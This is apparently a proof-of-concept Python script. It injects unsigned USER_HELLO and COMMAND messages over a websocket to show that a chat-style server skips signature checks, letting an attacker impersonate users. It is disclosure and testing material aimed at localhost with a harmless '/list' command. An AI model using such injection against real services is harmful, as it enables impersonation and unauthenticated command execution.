"""
Proof of Concept: Unsigned Transport Injection

This script exploits a vulnerability where the server fails to verify the cryptographic signature
of transport messages, allowing an attacker to inject unsigned messages. This can lead to
impersonation of users and execution of commands without proper authentication.

In a secure system, all messages should be signed, and signatures must be verified before processing.
"""

import asyncio
import json
import time

import websockets

from crypto import generate_rsa_keypair


async def main(host="127.0.0.1", port=8080, user="attacker"):
    uri = f"ws://{host}:{port}/ws"
    private_key_b64, public_key_b64 = generate_rsa_keypair()
    async with websockets.connect(uri) as ws:
        # Fake USER_HELLO: no auth, no transport signature
        await ws.send(json.dumps({
            "type": "USER_HELLO",
            "from": user, "to": "server", "ts": int(time.time() * 1000),
            "payload": {"client": "poc", "pubkey": public_key_b64}, "sig": ""
        }))

        # Inject unsigned COMMAND (/list)
        await ws.send(json.dumps({
            "type": "COMMAND",
            "from": user, "to": "server", "ts": int(time.time() * 1000),
            "payload": {"command": "/list"},
            "sig": ""  # <-- transport signature missing/invalid
        }))

        async for msg in ws:
            j = json.loads(msg)
            if j.get("type") == "COMMAND_RESPONSE":
                print("[OK] Server accepted unsigned command and responded:", j["payload"])
                break


if __name__ == "__main__":
    asyncio.run(main())
